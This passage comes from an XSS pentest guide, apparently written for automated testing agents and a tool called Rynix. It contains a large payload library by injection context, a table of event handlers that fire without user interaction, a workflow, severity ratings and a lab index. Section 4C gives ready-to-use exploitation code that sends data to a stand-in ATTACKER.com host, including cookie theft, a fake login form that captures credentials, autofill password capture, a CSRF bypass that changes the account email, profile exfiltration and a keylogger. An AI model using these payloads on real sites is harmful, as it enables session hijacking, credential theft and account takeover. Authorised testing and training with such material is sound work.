mXSS exploits parsing differentials between the sanitizer and the browser's HTML parser.

#### DOM Clobbering

Override JavaScript variables and DOM API properties by injecting HTML elements with specific `id` or `name` attributes:
```html
<form id="x"><input name="y" value="malicious">
<!-- Now document.x.y.value === "malicious" in JavaScript -->

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="javascript:alert(1)">
<!-- Clobbers window.defaultAvatar.avatar to a javascript: URL -->
```

DOM clobbering is useful when:
1. The application uses `window.someVar` or `document.getElementById()` with values that can be clobbered
2. You can inject HTML but not execute scripts directly (e.g., due to CSP)
3. The clobbered value flows into a sink like `innerHTML`, `src`, or `href`

> Lab refs: PS-DOM-06 (DOM clobbering to enable XSS), PS-DOM-07 (clobbering DOM attributes to bypass HTML filters)

#### Polyglot payloads

Single payloads that work across multiple contexts:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//%0telerik%0telerik%0telerik%0telerik%0telerik%0teelrik/telerik?telerik*/alert(1)//';alert(1)//";alert(1)//*/alert(1)//`-alert(1)//
```

Simpler polyglots:
```
'"><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
'-alert(1)-'
```

---

## 4. Payload Library

### 4A. By Context

#### HTML body payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<marquee onstart=alert(1)>
<xss autofocus onfocus=alert(1)>
<math><mtext><img src=x onerror=alert(1)>
```

#### HTML attribute payloads
```html
" onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
" onfocus=alert(1) autofocus="
'><img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
" accesskey="x" onclick="alert(1)" x="
```

#### JavaScript string payloads
```javascript
'-alert(1)-'
';alert(1)//
";alert(1)//
\';alert(1)//                    // when app escapes ' but not \
</script><img src=x onerror=alert(1)>   // break out of script tag
```

#### Template literal payloads
```javascript
${alert(1)}
${alert(document.domain)}
${constructor.constructor('alert(1)')()}
```

#### URL / href payloads
```
javascript:alert(1)
javascript:alert(document.domain)
javascript:void(0);alert(1)
javascript&#58;alert(1)
&#106;avascript:alert(1)
java%0ascript:alert(1)
java%09script:alert(1)
```

#### Event handler attribute payloads (inside existing handler)
```
&apos;-alert(1)-&apos;
&apos;);alert(1);//
&#39;-alert(1)-&#39;
```

#### DOM sink payloads

For `innerHTML`:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

For `document.write`:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

For `eval()` / `setTimeout` / `setInterval`:
```javascript
alert(1)
';alert(1)//
";alert(1)//
\x3cimg src=x onerror=alert(1)>
```

For `location.href` / `location.assign` / `window.open`:
```
javascript:alert(1)
```

For jQuery `$()` / `.html()` / `.append()`:
```html
<img src=x onerror=alert(1)>
```

For jQuery `.attr('href', x)`:
```
javascript:alert(1)
```

### 4B. Event Handlers That Fire Without User Interaction

These are the most valuable for automated exploitation because they execute immediately upon page load with no victim action beyond visiting the page.

| Event | Required Element/Setup | Payload Template |
|-------|----------------------|------------------|
| `onerror` | `<img src=x>` or `<video src=x>` | `<img src=x onerror=PAYLOAD>` |
| `onload` | `<body>`, `<img src=valid>`, `<iframe>`, `<svg>` | `<svg onload=PAYLOAD>` |
| `onfocus` + `autofocus` | `<input>`, `<textarea>`, `<select>`, any with `tabindex` | `<input autofocus onfocus=PAYLOAD>` |
| `onfocusin` | Any element with `autofocus` | `<xss autofocus onfocusin=PAYLOAD>` |
| `ontoggle` + `open` | `<details>` | `<details open ontoggle=PAYLOAD>` |
| `onanimationstart` | Any + CSS `@keyframes` + `animation-name` | `<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=PAYLOAD>` |
| `onanimationend` | Any + CSS `@keyframes` + short `animation-duration` | `<style>@keyframes x{from{}to{}}</style><xss style="animation:x .1s" onanimationend=PAYLOAD>` |
| `ontransitionend` | Any + CSS `transition` + property change | `<xss style="transition:all .1s" ontransitionend=PAYLOAD>` |
| `onbegin` | SVG `<animate>` or `<set>` | `<svg><animate onbegin=PAYLOAD attributeName=x dur=1s>` |
| `onend` | SVG `<animate>` | `<svg><animate onend=PAYLOAD attributeName=x dur=1s>` |
| `onrepeat` | SVG `<animate>` with `repeatCount` | `<svg><animate onrepeat=PAYLOAD attributeName=x dur=1s repeatCount=2>` |
| `onloadstart` | `<video autoplay>` or `<audio autoplay>` | `<video autoplay onloadstart=PAYLOAD><source src=x>` |
| `onstart` | `<marquee>` | `<marquee onstart=PAYLOAD>` |
| `onhashchange` | `<body>` (trigger via iframe hash change) | `<body onhashchange=PAYLOAD>` + iframe trigger |
| `onresize` | `<body>` (trigger via iframe resize) | `<body onresize=PAYLOAD>` + iframe trigger |
| `onpageshow` | `<body>` | `<body onpageshow=PAYLOAD>` |
| `onpopstate` | `<body>` (trigger via `history.pushState`) | `<body onpopstate=PAYLOAD>` |
| `onmessage` | `<body>` (trigger via `postMessage`) | `<body onmessage=PAYLOAD>` + attacker page |
| `oncontentvisibilityautostatechange` | Element with `content-visibility:auto` | `<xss style="content-visibility:auto" oncontentvisibilityautostatechange=PAYLOAD>` |
| `onslotchange` | Shadow DOM `<slot>` | `<template shadowrootmode=open><slot onslotchange=PAYLOAD></slot></template>` |
| `onsecuritypolicyviolation` | Any (triggered by CSP violation) | `<xss onsecuritypolicyviolation=PAYLOAD>` |
| `onbeforeprint` | `<body>` (triggered by `window.print()`) | `<body onbeforeprint=PAYLOAD>` |

### 4C. Proof-of-Concept Exploitation Payloads

These payloads demonstrate actual impact beyond `alert()`. Use these to prove exploitability in findings.

#### Cookie theft (exfiltration to attacker server)
```javascript
fetch('https://ATTACKER.com/steal?c='+document.cookie)
```
```javascript
new Image().src='https://ATTACKER.com/steal?c='+document.cookie
```
```html
<script>document.location='https://ATTACKER.com/steal?c='+document.cookie</script>
```

**Limitation:** Does not work if cookies have the `HttpOnly` flag set. Check cookie attributes first.

#### Credential capture via fake login form
```javascript
document.body.innerHTML='<h1>Session expired</h1><form action=https://ATTACKER.com/capture method=POST><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>';
```

#### Credential capture via password manager auto-fill
```javascript
var i=document.createElement('input');i.type='password';i.name='password';i.style.opacity=0;document.body.appendChild(i);setTimeout(function(){fetch('https://ATTACKER.com/steal?p='+i.value)},3000);
```

#### CSRF bypass via XSS (extract token + submit form)
```javascript
// Fetch a page containing a CSRF token, extract it, then submit a form
fetch('/settings').then(r=>r.text()).then(html=>{
  var token=html.match(/csrf['"]\s*value=['"](.*?)['"]/)[1];
  fetch('/settings/email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+token+'&email=attacker@evil.com'});
});
```

#### Session hijacking via XSS (fetch sensitive data)
```javascript
fetch('/api/user/profile').then(r=>r.json()).then(d=>{
  fetch('https://ATTACKER.com/exfil',{method:'POST',body:JSON.stringify(d)});
});
```

#### Keylogger injection
```javascript
document.onkeypress=function(e){fetch('https://ATTACKER.com/log?k='+e.key)};
```

#### Webcam/microphone access prompt
```javascript
navigator.mediaDevices.getUserMedia({video:true,audio:true});
```

**Note:** For pentest reporting, `alert(document.domain)` or `print()` is sufficient as proof of execution. Use `print()` when testing in cross-origin iframe contexts where Chrome blocks `alert()`. Full exploitation payloads are used to demonstrate business impact and justify severity ratings.

---

## 5. Testing Workflow Summary

### For automated pentest agents

1. **Inject canary** (`CANARY7x8k9m2q`) into every input parameter.
2. **Search responses** for canary in HTML body, attributes, JS strings, template literals, URLs.
3. **Identify context** using the table in section 1B.
4. **Call `get_witness_payloads(context)`** for context-matched initial payloads.
5. **Attempt basic payloads** for the identified context (section 2A-2E).
6. **If blocked**, determine what is filtered (tags? events? characters?) and apply bypass techniques (section 3A-3F).
7. **Fuzz tags and events** with fuzz-cli/dalfox if WAF is detected.
8. **Check CSP** (`Content-Security-Policy` header) and apply section 3D bypasses if script execution is blocked by policy.
9. **For DOM XSS**, trace sources to sinks in JavaScript (section 2D). Use browser DevTools breakpoints.
10. **Log finding** with full request/response evidence and a reproducible curl command.

### Severity assessment

| Scenario | Severity |
|----------|----------|
| Stored XSS, no auth required, affects all users | Critical |
| Stored XSS in admin panel affecting admin users | High |
| Reflected XSS with session token theft | High |
| Reflected XSS requiring user interaction to trigger | Medium |
| DOM XSS requiring specific hash/parameter manipulation | Medium |
| Self-XSS (only affects the injecting user) | Low / Informational |
| XSS blocked by CSP (no bypass found) | Low (potential) |
| Reflected XSS with HttpOnly cookies + strict CSP | Low (limited impact) |

### Chaining opportunities

- **XSS + Missing CSP**: Upgrade XSS severity (no browser-side mitigation).
- **XSS + Missing HttpOnly**: Cookie theft is possible, upgrade to High.
- **XSS + CSRF token bypass**: Full account takeover chain, upgrade to Critical.
- **Stored XSS + Admin panel**: Privilege escalation chain, upgrade to Critical.
- **DOM XSS + Open redirect**: Chain to deliver XSS via trusted domain link.
- **XSS + CORS misconfiguration**: Cross-origin data theft, upgrade severity.

---

## 6. Lab Reference Index

### XSS Labs (PS-XSS-01 through PS-XSS-30)

| Lab ID | Title | Difficulty | Primary Technique |
|--------|-------|------------|-------------------|
| PS-XSS-01 | Reflected XSS into HTML context with nothing encoded | APPRENTICE | HTML body injection |
| PS-XSS-02 | Stored XSS into HTML context with nothing encoded | APPRENTICE | Stored HTML body injection |
| PS-XSS-03 | DOM XSS in document.write sink using source location.search | APPRENTICE | DOM source-to-sink |
| PS-XSS-04 | DOM XSS in innerHTML sink using source location.search | APPRENTICE | innerHTML sink |
| PS-XSS-05 | DOM XSS in jQuery anchor href attribute sink using location.search source | APPRENTICE | jQuery .attr() sink |
| PS-XSS-06 | DOM XSS in jQuery selector sink using a hashchange event | APPRENTICE | jQuery $() selector sink |
| PS-XSS-07 | Reflected XSS into attribute with angle brackets HTML-encoded | APPRENTICE | Attribute breakout, event handler injection |
| PS-XSS-08 | Stored XSS into anchor href attribute with double quotes HTML-encoded | APPRENTICE | javascript: protocol in href |
| PS-XSS-09 | Reflected XSS into a JavaScript string with angle brackets HTML encoded | APPRENTICE | JS string breakout |
| PS-XSS-10 | DOM XSS in document.write sink using source location.search inside a select element | PRACTITIONER | document.write context escape |
| PS-XSS-11 | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded | PRACTITIONER | AngularJS template injection |
| PS-XSS-12 | Reflected DOM XSS | PRACTITIONER | Reflected DOM XSS via eval |
| PS-XSS-13 | Stored DOM XSS | PRACTITIONER | Stored data in DOM sink |
| PS-XSS-14 | Reflected XSS into HTML context with most tags and attributes blocked | PRACTITIONER | WAF bypass, tag/event enumeration |
| PS-XSS-15 | Reflected XSS into HTML context with all tags blocked except custom ones | PRACTITIONER | Custom tag + autofocus + onfocus |
| PS-XSS-16 | Reflected XSS with some SVG markup allowed | PRACTITIONER | SVG tag + animatetransform + onbegin |
| PS-XSS-17 | Reflected XSS in canonical link tag | PRACTITIONER | accesskey + onclick in link tag |
| PS-XSS-18 | Reflected XSS into a JavaScript string with single quote and backslash escaped | PRACTITIONER | Script tag termination (</script>) |
| PS-XSS-19 | Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped | PRACTITIONER | Backslash escape bypass |
| PS-XSS-20 | Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | PRACTITIONER | HTML entity encoding in event handler |
| PS-XSS-21 | Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped | PRACTITIONER | Template literal ${} injection |
| PS-XSS-22 | Exploiting cross-site scripting to steal cookies | PRACTITIONER | Cookie exfiltration payload |
| PS-XSS-23 | Exploiting cross-site scripting to capture passwords | PRACTITIONER | Fake login form injection |
| PS-XSS-24 | Exploiting XSS to bypass CSRF defenses | PRACTITIONER | CSRF token extraction + form submission |
| PS-XSS-25 | Reflected XSS with AngularJS sandbox escape without strings | EXPERT | AngularJS sandbox escape, String.fromCharCode |
| PS-XSS-26 | Reflected XSS with AngularJS sandbox escape and CSP | EXPERT | AngularJS $event.path + orderBy filter |
| PS-XSS-27 | Reflected XSS with event handlers and href attributes blocked | EXPERT | animate tag with SVG onbegin |
| PS-XSS-28 | Reflected XSS in a JavaScript URL with some characters blocked | EXPERT | JavaScript URL with character restrictions |
| PS-XSS-29 | Reflected XSS protected by very strict CSP, with dangling markup attack | PRACTITIONER | CSP bypass via dangling markup |
| PS-XSS-30 | Reflected XSS protected by CSP, with CSP bypass | EXPERT | CSP policy injection via report-uri |

### DOM-Specific Labs (PS-DOM-01 through PS-DOM-07)

| Lab ID | Title | Difficulty | Primary Technique |
|--------|-------|------------|-------------------|
| PS-DOM-01 | DOM XSS using web messages | PRACTITIONER | postMessage source + innerHTML sink |
| PS-DOM-02 | DOM XSS using web messages and a JavaScript URL | PRACTITIONER | postMessage + location.href sink |
| PS-DOM-03 | DOM XSS using web messages and JSON.parse | PRACTITIONER | postMessage + JSON.parse + innerHTML |
| PS-DOM-04 | DOM-based open redirection | PRACTITIONER | location source + redirect sink |
| PS-DOM-05 | DOM-based cookie manipulation | PRACTITIONER | URL source + document.cookie sink |
| PS-DOM-06 | Exploiting DOM clobbering to enable XSS | EXPERT | Element ID/name clobbering |
| PS-DOM-07 | Clobbering DOM attributes to bypass HTML filters | EXPERT | Attribute clobbering to bypass DOMPurify |
## Rynix workflow

1. `get_technique_guide` for `cross-site-scripting` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `browser-debug plugin`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `browser-debug plugin`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

